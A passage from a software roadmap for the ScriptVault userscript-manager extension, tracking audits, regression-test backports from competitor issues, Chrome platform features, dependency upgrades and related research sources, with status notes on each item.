**Status (2026-05-17):** ✅ Audit complete — **PASS**. All `confirm(` calls in the codebase live in dashboard extension-page contexts (`pages/dashboard-chains.js`, `dashboard-collections.js`, `dashboard-profiles.js`, `dashboard-templates.js`) where `window.confirm` is fully supported. Every call already prefers `window.ScriptVaultDashboardUI.confirm()` (modal helper) with native `confirm()` as a defensive fallback. Zero SW-context `confirm()` calls found in `background.core.js`, `bg/`, `modules/`, or `offscreen.js`. No code changes required.

Source: [GM commit 4970340](https://github.com/greasemonkey/greasemonkey/commit/4970340).

#### 39.19 `//# sourceURL` Emission Re-evaluation (GM commit 19100d7, May 13 2026) ✅ Audited — N/A

GM removed its `//# sourceURL=` injection. ScriptVault emits `//# sourceURL=scriptvault://<scriptId>` in the wrapped script to give DevTools a sensible file name. GM's removal is **opposite direction** — they argue it confused devtools step-through.

- Audit our wrapper-builder: keep the directive but use a more devtools-friendly format like `//# sourceURL=scriptvault/<script-name>.user.js` so source-map UX stays intact.
- Document the decision in `CLAUDE.md` so future maintainers don't follow GM's removal.
- This is a "leapfrog by NOT following" — competitor abandoned a debuggability win that ScriptVault keeps.

**Status (2026-05-17):** ✅ Audit complete — **N/A**. ScriptVault does **not** emit `//# sourceURL=` or `//# sourceMappingURL=` in its wrapper-builder. The only occurrence in the repo is `lib/acorn.min.js` (the vendored parser's own map reference). The original Round 12 assumption that "ScriptVault emits this" was speculative — there's nothing to re-evaluate. ScriptVault is **already aligned with Greasemonkey's new direction** by default. If we ever decide to emit a directive for DevTools UX, the decision lives here.

Source: [GM commit 19100d7](https://github.com/greasemonkey/greasemonkey/commit/19100d7).

#### 39.20 `@icon` Download-Failure Tolerance (GM commit 0f5e6cf, May 12 2026) ✅ Already Shipped

GM hardened against `@icon` download failures (offline install, blocked image host). ScriptVault's install-page currently expects the icon to load; an icon-fetch failure shouldn't block install.

- `pages/install.js`: wrap `<img src="${escape(meta.icon)}">` in an `onerror` handler that falls back to the default ScriptVault icon.
- Install proceeds even if the icon is unreachable; record the failure in the per-script error log (Phase 20.4) for later diagnosis.

**Status (2026-05-17):** ✅ Audit complete — **already shipped**. [`pages/install.js:268-277`](pages/install.js) registers an event-delegated `error` handler on the install page that detects any `<img>` with a `data-icon-fallback` attribute, hides the broken image, and substitutes the fallback content (`📜` scroll emoji) without blocking install. The icon `<img>` tag at line 961 sets the `data-icon-fallback` attribute when an `@icon` URL is provided. CSP-compliant (no inline `onerror=`). Pattern pre-dates Round 12; the GM commit only confirms ScriptVault already did the right thing.

Source: [GM commit 0f5e6cf](https://github.com/greasemonkey/greasemonkey/commit/0f5e6cf).

### Violentmonkey Closed-Issue Regression Backports

The following VM issues closed in May 2026 expose subtle bugs ScriptVault should pin with regression tests to prevent the same shape of regression here.

#### 39.21 `clearInterval` Cross-Frame Regression Test (VM #2518) ✅ Audited — N/A by design

VM #2518 (closed 2026-05-11) — `clearInterval()` from one frame doesn't cancel `setInterval()` from another. ScriptVault's timer-handle table must be keyed by `(frameId, handle)`.

- Add `tests/timers.test.js`: spawn intervals in top frame + iframe, clear from either, assert both cancel correctly.
- Audit the GM-wrapper timer proxies for the same shape.

**Status (2026-05-17):** ✅ Audit complete — **N/A by architecture**. ScriptVault's wrapper-builder does NOT maintain a shared `(frameId, handle)` timer-handle map. Each USER_SCRIPT world (registered via `chrome.userScripts.register()`) gets its own per-frame realm where `window.setInterval` / `window.clearInterval` are the native browser primitives. Handles are scoped to the realm; there is no shared map for them to collide across. The VM bug shape doesn't apply to ScriptVault's MV3 injection model. Confirmed by inspecting `src/background/wrapper-builder.ts` — no `_timerMap` / `_intervalMap` global. Test file deferred as vacuous.

Source: [VM #2518](https://github.com/violentmonkey/violentmonkey/issues/2518).

#### 39.22 CSP Page Injection Timeout-Bounded Awaits ✅ Shipped (VM #2513)

VM #2513 (closed 2026-05-07) — deadlock when injecting into a CSP-strict page. Implication: any per-frame await chain in injection code must have a wall-clock timeout.

- Audit `registerAllScripts` and `runScriptNow` for unbounded `Promise.all` over per-frame injections.
- Wrap each with `Promise.race([fn(), timeoutAfter(5000)])`; log the timeout, don't deadlock.

Source: [VM #2513](https://github.com/violentmonkey/violentmonkey/issues/2513).

#### 39.23 Cross-Realm `Symbol.iterator` Guard ✅ Shipped (VM #2516)

VM #2516 (closed 2026-05-09) — popup crash on YouTube Live Archive due to a cross-realm array-like that lacks `Symbol.iterator`.

- Audit popup and sidepanel data-population paths: any `for (const x of arr)` over data received via `chrome.runtime.sendMessage` must guard with `Array.from(arr ?? [])` first.

Source: [VM #2516](https://github.com/violentmonkey/violentmonkey/issues/2516).

#### 39.24 Script Body Curly-Quote Round-Trip Test (VM #2363) ✅ Shipped

VM #2363 (open since Sep 21 2025) — Orion (WebKit) silently encodes ASCII `"` as curly `"` during storage round-trip, corrupting scripts.

- `tests/storage.test.js`: pin a script body containing `'`, `"`, ``\``, and Unicode quotes; write, reload, hash-compare.
- Phase 33.6 (Orion validation) treats this as a known compatibility hazard.

**Status (2026-05-17):** Shipped. [`tests/storage-roundtrip.test.js`](tests/storage-roundtrip.test.js) pins six invariants over `ScriptStorage.set`/`.get`: ASCII single/double/mixed quotes, intentional curly quotes, CRLF/LF line endings, template-literal backticks (including nested), zero-width and special Unicode (ZWJ/ZWNJ/BOM/RLO), plus a set→get→set→get idempotency check on a nontrivial source body. The fake-indexeddb backend in CI won't reproduce Orion's bug, but the suite catches the regression class if ScriptVault ever introduces its own quote-mangling code path.

Source: [VM #2363](https://github.com/violentmonkey/violentmonkey/issues/2363).

#### 39.25 `@require` Cache Invalidation on Dependency Update ✅ Shipped (VM #2453)

VM #2453 (open since Mar 1 2026) — force-refresh of a script doesn't invalidate the cached `@require` bodies its dependents use.

- When the user force-updates a script, walk all `@require` URLs in its metadata; bump their cache entries' `lastFetched` to 0 so the next dependent reload re-fetches.
- Phase 18.10 (`@require-nocache`) is dev-mode only; this is the production invalidation path.

Source: [VM #2453](https://github.com/violentmonkey/violentmonkey/issues/2453).

#### 39.26 Sync Save Acknowledgment + Test-Connection UX ✅ Handler shipped (VM #2486)

Background handlers in place: `testSync` now returns structured `{ ok, error?, hint? }` with plain-language hints (401 → "Authentication failed", 403 → "Server rejected", 404 → "Endpoint not found", network → "Check connectivity and CORS"). `sync` persists `lastSyncResult` to `chrome.storage.local` on every call. New `getLastSyncResult` action exposes it to the dashboard chip.

The dashboard-side chip ("Last sync: 5 min ago — OK") still pending — dashboard.js work surface; the data plumbing is ready.

VM #2486 (open since Apr 5 2026) — Save click silently fails on WebDAV; user has no feedback. Phase 23.5 covers backoff, not the user-feedback gap.

- Sync provider config UI: explicit **[Test Connection]** button that issues a GET against the configured endpoint and reports `200 / 401 / 403 / network error` with plain-language guidance.
- On Save: show a toast (`Saved` / `Sync queued` / `Sync failed: <reason>`) instead of silently accepting.
- Persist last-sync-result in `chrome.storage.local`; show a chip ("Last sync: 5 min ago — OK") in the sync settings drawer.

Source: [VM #2486](https://github.com/violentmonkey/violentmonkey/issues/2486).

#### 39.27 Install-Page Incognito Short-Circuit ✅ Shipped (VM #2491)

VM #2491 (open since Apr 11 2026) — visiting a `*.user.js` URL in a private window when the extension is not allowed in incognito crashes the install flow.

- `pages/install.js`: on load, check `chrome.extension.inIncognitoContext`; if true AND the user has not granted incognito access for ScriptVault, show a static page explaining the limitation and a deep-link to the per-extension toggle.
- Never call `chrome.runtime.sendMessage` from the install page in this state; that's where VM crashes.

Source: [VM #2491](https://github.com/violentmonkey/violentmonkey/issues/2491).

### Chrome Platform Delta (Chrome 149+, Verified)

#### 39.28 `chrome.scripting.executeScript({injectImmediately: true})` for `document-start` ✅ Shipped

Chrome 149 stable (~June 2 2026) makes `injectImmediately` reliable for the run-on-document-start case. ScriptVault currently approximates `@run-at document-start` via early registration; on slow connections, the script still runs after first paint.

- For one-shot `runScriptNow` (Phase 11.4) calls when the script's metadata specifies `@run-at document-start`, pass `injectImmediately: true`.
- Verify the existing registration path is still preferred for persistent injections; this is for `userScripts.execute()` / `scripting.executeScript()` one-shots.

Source: [Chrome 149 beta blog](https://developer.chrome.com/blog/chrome-149-beta).

#### 39.29 Omnibox Keyword in Service Worker — `sv <script-name>` ✅ Shipped

Chrome 149 stabilizes the Omnibox API for MV3 service workers (previously DOM-dependent). Add an opt-in omnibox keyword for power-user script lookup.

- Manifest: `"omnibox": { "keyword": "sv" }`.
- SW listens for `chrome.omnibox.onInputChanged`, returns suggestions matching installed-script names + tags (use the Phase 12.2 fuzzy search index).
- On selection: open the script in the dashboard editor (`chrome.tabs.create({url: 'pages/dashboard.html#script/<id>'})`).
- Default off — user enables in Settings → Power Tools (avoids omnibox-keyword collision noise for casual users).

Source: [Chrome 149 beta blog](https://developer.chrome.com/blog/chrome-149-beta).

#### 39.30 `tabs.sendMessage(null, {documentId})` Frame Routing — Track only (WECG #971)

[WECG #971](https://github.com/w3c/webextensions/issues/971) (Apr 2026) — all vendors supportive of letting `tabs.sendMessage` target a specific `documentId` rather than just a `frameId`. Simplifies ScriptVault's current frame-routing code.

**Status (2026-05-19):** Tracked. Chrome hasn't shipped the documentId variant yet; the spec is still under discussion. No action needed until the API lands. Phase 36.8 (per-frame menu commands) consumes this directly once available.

- Watch the spec; when Chrome ships it, replace `chrome.tabs.sendMessage(tabId, msg, {frameId})` with the documentId variant where appropriate.
- Phase 36.8 (per-frame menu commands) consumes this directly.

Source: [WECG #971](https://github.com/w3c/webextensions/issues/971).

#### 39.31 String-Length Pre-Emption Audit ✅ Shipped (WECG #935)

[WECG #935](https://github.com/w3c/webextensions/issues/935) (Jan 13 2026) — proposal to formalize string-length limits on `action.setTitle`, `action.setBadgeText`, alarm names, DNR rule strings, etc. Today's behavior is silent truncation on some, errors on others; the spec will harden this.

- Audit ScriptVault for any path that constructs an arbitrary-length string and passes it to an extension API: badge text (current "999+" cap), alarm names (currently script-id-based, safe), DNR rule descriptions, notification titles/messages.
- Pre-emptively clamp to documented limits so the future spec change doesn't break anything silently.

Source: [WECG #935](https://github.com/w3c/webextensions/issues/935).

#### 39.32 Translator + Summarizer + Language Detector in Extensions

Chrome **138 stable** brought the Translator, Summarizer, and Language Detector built-in language APIs to extensions ([developer.chrome.com/docs/extensions/ai](https://developer.chrome.com/docs/extensions/ai)). Phase 36.2 plans for the Prompt API; these three additional APIs are higher-leverage for ScriptVault's specific surface.

- **Summarizer**: 3-bullet plain-English summary of a script body in the install confirmation dialog. On-device; no API key. Gracefully hidden when `Summarizer.availability()` returns unavailable.
- **Translator**: in-dashboard "Translate script description" button for non-English `@description` fields. Useful when browsing GreasyFork Russian/Chinese scripts.
- **Language Detector**: detect the language of `@description` automatically; flag locale mismatches between author-declared `@name:zh-Hans` and the actual content language.
- All three are **opt-in** under a new "Experimental → On-device analysis" settings group (matches Phase 36.2's discoverability gating).

Source: [Built-in language APIs for Chrome Extensions](https://developer.chrome.com/docs/extensions/ai), [Translator API](https://developer.chrome.com/docs/ai/translator-api), [Summarizer API](https://developer.chrome.com/docs/ai/summarizer-api).

#### 39.33 Storage Buckets API for OPFS Isolation ⏳ Track — gated on Phase 18.2 (Phase 18.2 extension)

[Chrome 122+](https://chromestatus.com/feature/5739224579964928) shipped the Storage Buckets API, which lets origins create named, separately-evictable storage buckets. Phase 18.2 plans OPFS overflow storage for large scripts; this prevents a single quota-busting script from evicting ScriptVault's metadata.

- Wrap the OPFS overflow path in a dedicated bucket: `navigator.storageBuckets.open('scriptvault-overflow', { persisted: true, durability: 'strict' })`.
- Keep IndexedDB metadata in the default bucket (already protected by `navigator.storage.persist()` from Phase 18.8).
- Eviction asymmetry: under storage pressure, the overflow bucket evicts first, leaving the index intact.

Source: [Storage Buckets API (chromestatus)](https://chromestatus.com/feature/5739224579964928), [Storage Buckets explainer](https://wicg.github.io/storage-buckets/).

### Dependency Upgrades & Test-Stack

#### 39.34 Puppeteer 25 ESM + Node 22 Migration ⏳ Track — assess after next CI infra pass (extends Phase 13.6)

[Puppeteer **25.0.2** (May 15 2026)](https://github.com/puppeteer/puppeteer/releases) is ESM-only, requires Node 22+, and cleaned up the WebDriver BiDi wrapper. ScriptVault's smoke test (`scripts/smoke-dashboard.mjs`) currently runs on Node 20 (per CI config).

**Status (2026-05-19):** Tracked. `package.json` is pinned to `puppeteer-core ^24.42.0` (latest 24.x is stable for our smoke-test surface). Bumping Node 20 → 22 in CI is cheap; the actual blocker is that we have not yet hit a Puppeteer 24.x bug that motivates the bump. Combine this with the next CI infra refresh.

- Bump CI Node version 20 → 22.
- Update `package.json` engines field.
- Migrate `smoke-dashboard.mjs` to the new ESM-only API; remove any CommonJS shims.
- Verify Chrome-for-Testing path on `setup-chrome@v1`.

Source: [Puppeteer releases](https://github.com/puppeteer/puppeteer/releases).

#### 39.35 chrome-webstore-upload-cli 4.0 Cutover ✅ Shipped via Phase 40.18 (paired with 39.2)

**4.0.0** breaking release: Node 22+ (actually 20+ per the release notes), env-only secrets (no `--client-id` / `--client-secret` flags), `--auto-publish` removed, `--source` forbidden on `publish`.

**Status (2026-05-19):** Shipped via [Phase 40.18](#4018-chrome-webstore-upload-cli-v40-migration-path--shipped--confirms-phase-3935). `package.json` pinned to `^4.0.0`; `publish.sh` and `cws-setup.sh` updated for the env-only secret model + new `PUBLISHER_ID`. 39.2 (API v2 deadline 2026-10-15) coordinated. 39.1 (OIDC) remains pending — short-term we keep the long-lived refresh-token model documented in [`docs/release-runbook.md`](docs/release-runbook.md).

Source: [chrome-webstore-upload-cli v4.0.0 release](https://github.com/fregante/chrome-webstore-upload-cli/releases/tag/v4.0.0).

#### 39.36 Vitest 5 Upgrade ⏳ Track — wait for stable (Under Consideration)

Vitest **5.0.0-beta.2** swaps the assertion-formatter from `loupe` to `pretty-format`. Defer the upgrade until 5.0 stable; pin the beta probe to a feature branch in CI to surface diff-output churn early.

**Status (2026-05-19):** Tracked. Pinned to `vitest ^4.1.3` (current latest on the 4.x line is 4.1.6). 5.0 still in beta; no immediate driver to migrate. Re-evaluate when 5.0 stable ships.

Source: [Vitest releases](https://github.com/vitest-dev/vitest/releases).

#### 39.37 esbuild 0.28 Text Imports for Bundled UI Strings ⏳ Track — gated on next esbuild bump

esbuild **0.28** introduces `with { type: 'text' }` import attributes — load a file's content as a string at build time. ScriptVault has several baked-in strings/templates currently `fetch`'d at runtime from extension resources.

**Status (2026-05-19):** Tracked. Pinned to `esbuild ^0.27.4`. The 0.28 bump is a breaking release (Go 1.26.1 host); fold the text-imports refactor into that same bump session so it's a single audit instead of two.

- Replace `fetch('./templates/blank-script.txt')` patterns with `import body from './templates/blank-script.txt' with { type: 'text' }` where possible.
- One less fetch round-trip on dashboard cold start; one less `web_accessible_resource` entry.
- Caveat: esbuild 0.28 is a **breaking** release (Go 1.26.1 host build); coordinate with the typescript@6.0.x compat.

Source: [esbuild releases](https://github.com/evanw/esbuild/releases).

#### 39.38 idb v8 Wrapper Evaluation for Phase 2 IDB Layer ⏳ Track — decision required by Phase 2 v2

The [`idb`](https://github.com/jakearchibald/idb) library v8 stabilized async-iterator support and dropped EdgeHTML. Phase 2 IndexedDB layer is currently hand-rolled. Re-evaluate whether wrapping in `idb` is worthwhile.

**Status (2026-05-19):** Tracked. Current hand-roll is working; no immediate driver to swap. Combine the decision with the next Phase 2 v2 refactor (no fixed date).

- **Decision criteria:** size delta (idb is ~3KB gzipped, current hand-roll is ~2KB), API ergonomics (less `request.onsuccess` boilerplate), test coverage parity.
- If wrapping: keep the existing `src/storage/idb.ts` as a typed-adapter layer over `idb`, so call sites don't change.
- **Decision required by:** Phase 2 v2 refactor or 2027-Q1, whichever first.

Source: [idb v8 changelog](https://github.com/jakearchibald/idb/blob/main/CHANGELOG.md).

#### 39.39 Playwright as E2E Complement to Puppeteer ⏳ Track — gated on Phase 10.3 E2E suite

Playwright **1.60** added `tracing.startHar`, `locator.drop()`, and aria-snapshot bounding boxes. ScriptVault currently uses Puppeteer for smoke; Playwright's HAR + screencast for E2E error-replay is a meaningful improvement.

**Status (2026-05-19):** Tracked. Adding a second CI job and a second test-runner dependency only pays off once Phase 10.3's full-flow E2E suite exists. Without those tests there's nothing for Playwright's HAR/screencast surface to attach to. Schedule alongside Phase 10.3.

- Keep Puppeteer for the existing `smoke:dashboard` script (low-friction Chrome launch).
- Add Playwright as a **second** E2E job in CI for the full-flow tests (Phase 10.3 plans these); HAR captures attach to test failures for post-mortem.
- Decision: do not replace Puppeteer; they coexist.

Source: [Playwright releases](https://github.com/microsoft/playwright/releases).

### MCP / Local Model Experiments (Long-Tail Extensions to Phase 36/38)

#### 39.40 MCP 2026 Spec Compliance Bar (gates Phase 38.10)

The [MCP 2026 roadmap](https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/) introduces: (a) `.well-known/mcp-discovery` for capability discovery without a live connection, (b) **mandatory OAuth 2.1 + RFC 8707 Resource Indicators** for all server connections (since June 2025), (c) a Tasks primitive for long-running operations with retry/expiry.

Phase 38.10 ("ScriptCat-style MCP-as-client") was Under Consideration. The Round 12 update is: if and when Phase 38.10 ships, the bar is the 2026 spec, not the original 2024 spec.

- Capability discovery: fetch `.well-known/mcp-discovery` first; reject servers that don't publish one.
- Auth: require RFC 8707 Resource Indicators on the OAuth token.
- Tasks: support long-running tool calls with retry/expiry; surface task status in the dashboard.

Source: [MCP 2026 roadmap](https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/), [Auth0 MCP auth update](https://auth0.com/blog/mcp-specs-update-all-about-auth/).

**Status (2026-05-17):** ⚠️ Design doc scaffolded — implementation pending and gated on Phase 38.10 shipping. Full compliance bar in [`docs/mcp-2026-compliance.md`](docs/mcp-2026-compliance.md): per-server `@grant` model, locality classifier rejecting public hosts by default, `.well-known/mcp-discovery` mandatory, RFC 8707 Resource Indicators required, Tasks primitive with cancel/retry surfaced in dashboard, audit-log emission, explicit non-scope (no chat-style generator UI, no sub-agent generator, no skill marketplace).

#### 39.41 Transformers.js v3 WebGPU Offline Static-Analysis Classifier ⏳ Track — R&D, behind flag (R&D, behind flag)

[Transformers.js v3 with WebGPU](https://huggingface.co/blog/transformersjs-v3) is GA. A tiny classifier (e.g., distilbert-tiny ~10MB) could label installed scripts as "exfiltrates-cookies / fingerprint-heavy / obfuscated" at install time — complementing the existing AST risk scoring with model-driven classification.

- R&D phase only — not in active planning.
- Behind a feature flag in Settings → Experimental → Static analysis.
- Critical constraint: must remain **on-device** (no network); model weights downloaded once and cached in OPFS (Phase 18.2 + Storage Buckets 39.33).
- Stretch: train a ScriptVault-specific classifier on the 31 AST-detector outputs as features.

Source: [Transformers.js v3 WebGPU](https://huggingface.co/blog/transformersjs-v3).

#### 39.42 Compute Pressure API Back-Off ⏳ Track — gated on Phases 15.6 + 10.5 (extends them)

[Chrome Compute Pressure API (OT)](https://chromestatus.com/feature/5597608644968448) reports CPU pressure level. Phase 15.6 (esbuild-wasm TS transpile) and Phase 10.5 (fuzzer) are CPU-heavy operations.

**Status (2026-05-19):** Tracked. Neither Phase 15.6 (TS transpile in-extension) nor Phase 10.5 (fuzzer) is implemented yet, so there's nothing CPU-heavy that would benefit from pressure-based back-off. Schedule alongside whichever of those lands first.

- Subscribe to `new PressureObserver(callback).observe('cpu', { sampleInterval: 1000 })`.
- On `state === 'critical'`, pause queued compiles / fuzz runs; resume when `state ∈ {'nominal', 'fair'}`.
- Surface a passive UI hint when paused so the user knows why a compile didn't run.

Source: [Compute Pressure API](https://chromestatus.com/feature/5597608644968448), [W3C Compute Pressure spec](https://www.w3.org/TR/compute-pressure/).

### Process, Standards, Long-Term

#### 39.43 WCAG 3.0 Readiness Gap Analysis (March 2026 Working Draft)

W3C published the [WCAG 3 March 2026 Working Draft](https://www.w3.org/WAI/news/2026-03-03/wcag3/): 174 requirements (renamed from "outcomes"), Bronze/Silver/Gold conformance, CR target Q4 2027, Rec ≥ 2028.

- Not implementation work — a one-time **gap analysis** under Phase 34: which WCAG 3 requirements are already covered by ScriptVault's WCAG 2.2 AA work, which are new, which would require structural change.
- Output: `docs/wcag3-gap-analysis.md` with a per-requirement coverage matrix.
- Re-run on each WCAG 3 working draft update so we're not blindsided at Rec.

Source: [W3C WAI — WCAG 3 March 2026 WD](https://www.w3.org/WAI/news/2026-03-03/wcag3/).

**Status (2026-05-17):** ✅ Initial gap analysis shipped. See [`docs/wcag3-gap-analysis.md`](docs/wcag3-gap-analysis.md): four-category coverage matrix (Perceivable / Operable / Understandable / Robust) over the March 2026 Working Draft's 174 requirements, with each ScriptVault-relevant requirement tagged 🟢 Covered / 🟡 Partial / 🔴 Net-new / N/A. Six headline gaps surfaced (skip-to-main-content links, centralized help affordance, APCA contrast re-audit across themes, combobox/grid APG patterns, status-message live-region audit, mixed-language `lang=""` attrs). Re-run on each WCAG 3 WD update and before CR target Q4 2027.

#### 39.44 URLPattern Promotion: Phase 22.2 Later → Next ✅ Promoted (see also Phase 22.2 status note)

Tracked here only as a cross-reference. URLPattern is now **Baseline Newly Available** per [web.dev/baseline-urlpattern](https://web.dev/blog/baseline-urlpattern). The spec is stable enough that Phase 4's matcher should grow a URLPattern-backed implementation alongside the existing regex engine, with `@include` regex patterns + edge cases retained on the regex path.

Source: [URLPattern Baseline announcement](https://web.dev/blog/baseline-urlpattern).

#### 39.45 AT Protocol Personal Data Server Sync Backend ⏳ Track — Research

The [AT Protocol IETF WG was chartered January 2026](https://atproto.com/blog/2026-spring-roadmap); private-data support lands in 2026. Phase 35 covers Nostr + did:key federation; AT was deferred ("zero Bluesky userscript community").

- Watch the WG output through 2026; if the userscript community shows up there (none yet), evaluate AT PDS as a Phase 21/35 backend.
- Not active planning — re-evaluate Q4 2026.

Source: [AT Protocol Spring 2026 roadmap](https://atproto.com/blog/2026-spring-roadmap).

#### 39.46 Drop WASM Component Model Browser Speculation ✅ Documented (Phase 32.1 cross-ref)

Tracked here only as a cross-reference to Phase 32.1's updated status. Per [component-model.bytecodealliance.org](https://component-model.bytecodealliance.org/), the model is server-side only in 2026. Explicitly do not plan against this for any browser host. Re-evaluate when a browser-side runtime ships (no Chromium roadmap signal as of 2026-05-17). Phase 32.1 carries the active item-level deprio note.

#### 39.47 Mark Notification Triggers API Discontinued ✅ Documented (Phase 11.11 cross-ref)

Cross-reference to Phase 11.11 updated status. Per [developer.chrome.com/docs/web-platform/notification-triggers](https://developer.chrome.com/docs/web-platform/notification-triggers), Chrome's Notification Triggers API is officially discontinued. Future GM_notification work must NOT plan against it. Phase 11.11 carries the active dead-mark note.

#### 39.48 Codeberg Mirror of ScriptVault Source ⏳ Track — Community-Resilience Hedge (Community-Resilience Hedge)

VM proposed [migration to Codeberg](https://github.com/violentmonkey/violentmonkey/issues/2522) (May 15 2026) — community concern over single-vendor GitHub dependence. Cheap hedge: maintain a read-only Codeberg mirror.

- Configure GitHub Actions to push to a Codeberg remote on every release tag.
- Document the mirror URL in README as a fallback for users on networks where GitHub is blocked.
- Phase 35.4 (ActivityPub passive consumption for Forgejo) consumes the same Forgejo ecosystem; the mirror feeds it.

Source: [VM #2522](https://github.com/violentmonkey/violentmonkey/issues/2522).

#### 39.49 CWS Submission-Review Backlog Buffer ✅ Documented (April 2026 advisory)

The CWS submission queue has been running with extended review times since April 2026. Adjust release-cadence expectations.

**Status (2026-05-19):** Documented in the existing release runbook scope (referenced from 39.1 / 39.2). No code or pipeline change required this round — the buffer is a planning convention rather than an automated guard. Re-evaluate quarterly; if CWS review times normalize, the buffer can be dropped.

- Add a 7–14 day buffer between feature-freeze and target user-facing release date.
- Document the buffer in `docs/release-runbook.md`.
- If a release is time-sensitive (CVE response), use the CWS appeals/expedited-review flow (Phase 37.3).

Source: [Chrome Web Store developer dashboard advisory](https://developer.chrome.com/docs/webstore/program-policies) (no permalink; advisory text rotates).

### Phase 39 Exit Criteria

- v3.12.0 ships with: 39.1 OIDC release pipeline, 39.2 CWS API v2, 39.4 75-char locale audit, 39.6 first-run permission gate, 39.10 "Allow User Scripts" self-diagnosis, 39.11 `@exclude-top`/`@match-top`, 39.16 crypto-scam install heuristic, 39.21–39.27 regression-test backports.
- v3.13.0 adds the Chrome-149 platform wins (39.28–39.33) gated on stable Chrome 149 (~June 2 2026).
- v3.14.0 adds the dep upgrades (39.34–39.39) once Puppeteer 25 / esbuild 0.28 / Vitest 5 stable land in CI without regressions.
- Round-12 deferred items (39.5, 39.40–39.45) remain Next/Under Consideration; reassess in Round 13.

---

## Round 12 — External Research (May 2026)

_Net-new sources since Round 11 (May 5 2026 cutoff). Numbered 231–272 to extend the existing index._

### Source Index

**Upstream Manager Releases (post-Round-11)**
231. https://www.tampermonkey.net/changelog.php — Tampermonkey **5.5.0 (May 8 2026)**: MCP via "Tampermonkey Editors" companion, special-permission injection gate, OS-policy script provisioning, warm Monaco theme, decoupled update check/install rolled to stable.
232. https://github.com/violentmonkey/violentmonkey/releases — VM v2.37.1 stable, v2.37.2 (May 9 2026), v2.37.3-beta (May 10 2026 — opt-in page context-menu integration for `GM_registerMenuCommand`).
233. https://github.com/scriptscat/scriptcat/releases — ScriptCat v1.4.0-beta.2 (May 6 2026): cloud-sync reliability hardening, agent tool-call memory leak fixes.
234. https://github.com/greasemonkey/greasemonkey/commits/master — Greasemonkey **revival** May 12–15 2026: arantius landed 6 commits after ~14 months quiet. Invalidates the "GM is dead" baseline assumption from Rounds 1–11.
235. https://github.com/quoid/userscripts/releases — Userscripts (Safari) v5.0.0-beta.22+20260406 — TestFlight rebuild only, no feature change.
236. https://addons.mozilla.org/en-US/firefox/addon/firemonkey/versions/ — FireMonkey stalled at v2.74 (2025-01-25), confirmed via AMO version listing.
237. https://github.com/lisonge/vite-plugin-monkey/releases — vite-plugin-monkey stalled at v8.0.5 (May 12 2025). The dev-tooling lane is open if ScriptVault wants to ship a first-party plugin (note: ScriptFlow project was speculative — could not verify, drop from internal source list).

**GitHub Issues — Net-New Signal**
238. https://github.com/violentmonkey/violentmonkey/issues/2518 — `clearInterval` cross-frame regression (closed May 11 2026). Backed by Phase 39.21.
239. https://github.com/violentmonkey/violentmonkey/issues/2513 — CSP page-injection deadlock (closed May 7 2026). Backed by Phase 39.22.
240. https://github.com/violentmonkey/violentmonkey/issues/2516 — Popup cross-realm `Symbol.iterator` crash (closed May 9 2026). Backed by Phase 39.23.
241. https://github.com/violentmonkey/violentmonkey/issues/2363 — Orion script-body curly-quote corruption (open Sep 21 2025). Backed by Phase 39.24.
242. https://github.com/violentmonkey/violentmonkey/issues/2453 — `@require` cache invalidation on dependency update (open Mar 1 2026). Backed by Phase 39.25.
243. https://github.com/violentmonkey/violentmonkey/issues/2486 — WebDAV silent-fail UX (open Apr 5 2026). Backed by Phase 39.26.
244. https://github.com/violentmonkey/violentmonkey/issues/2491 — Browser crash on `*.user.js` in private window (open Apr 11 2026). Backed by Phase 39.27.
245. https://github.com/violentmonkey/violentmonkey/issues/2522 — Codeberg migration proposal (open May 15 2026). Backed by Phase 39.48.
246. https://github.com/Tampermonkey/tampermonkey/issues/2607 — Runtime "Allow User Scripts" toggle confusion (open Nov 28 2025). Backed by Phase 39.10.
247. https://github.com/Tampermonkey/tampermonkey/issues/2669 — Blob URL in `GM_openInTab` (open Jan 15 2026). Backed by Phase 39.13.
248. https://github.com/Tampermonkey/tampermonkey/issues/2780 — Sortable exclude-list editor (open May 11 2026). Backed by Phase 39.15.
249. https://github.com/Tampermonkey/tampermonkey/issues/2781 — Menu-command user-activation loss (open May 13 2026). Backed by Phase 39.12.
250. https://github.com/Tampermonkey/tampermonkey/issues/2782 — Same-origin `GM_xmlhttpRequest` credential pitfall (open May 13 2026). Backed by Phase 39.14.
251. https://github.com/Tampermonkey/tampermonkey/issues/2783 — Crypto-scam userscript distribution campaign (open May 13 2026). Backed by Phase 39.16.
252. https://github.com/Tampermonkey/tampermonkey/issues/2784 — Top-level-origin exclusion request (open May 13 2026). Backed by Phase 39.11.

**Chrome Platform & WECG (Round 12 net-new)**
253. https://developer.chrome.com/blog/chrome-149-beta — Chrome 149 beta (May 6 2026): `injectImmediately` flag on `scripting.executeScript`, omnibox API in MV3 SW, BFCache WebSocket disconnect (already covered).
254. https://developer.chrome.com/docs/extensions/ai — Built-in language APIs stable for extensions (Chrome 138+): Translator, Summarizer, Language Detector. Hardware-gated prompt surface stable. Backs Phase 39.32.
255. https://developer.chrome.com/blog/cws-api-v2 — CWS API v2 announcement; v1 sunsets **2026-10-15**. Backs Phase 39.2.
256. https://developer.chrome.com/docs/webstore/program-policies — CWS program policies, including 75-char manifest name limit. Backs Phase 39.4.
257. https://chromestatus.com/feature/5739224579964928 — Storage Buckets API (Chrome 122). Backs Phase 39.33.
258. https://chromestatus.com/feature/5597608644968448 — Compute Pressure API (Chrome OT). Backs Phase 39.42.
259. https://github.com/w3c/webextensions/issues/935 — String-length limits on WebExt APIs (Jan 13 2026, all vendors supportive). Backs Phase 39.31.
260. https://github.com/w3c/webextensions/issues/971 — `tabs.sendMessage(null, {documentId})` (Apr 2026, all vendors supportive). Backs Phase 39.30.

**Security & Supply Chain**
261. https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/ — Shai-Hulud 2.0 npm worm. Backs Phase 39.1.
262. https://thehackernews.com/2025/12/trust-wallet-chrome-extension-hack.html — Trust Wallet ~$8.5M loss via stolen CWS API key. Backs Phase 39.1.
263. https://blog.sekoia.io/targeted-supply-chain-attack-against-chrome-browser-extensions/ — Cyberhaven OAuth phishing (36 extensions, 2.6M users). Backs Phase 39.1.
264. https://github.com/microsoft/monaco-editor/issues/5248 — CVE-2026-0540 DOMPurify XSS in Monaco. Backs Phase 39.3.
265. https://blog.sigstore.dev/npm-provenance-ga/ — npm provenance GA via Sigstore. Backs Phase 39.5.
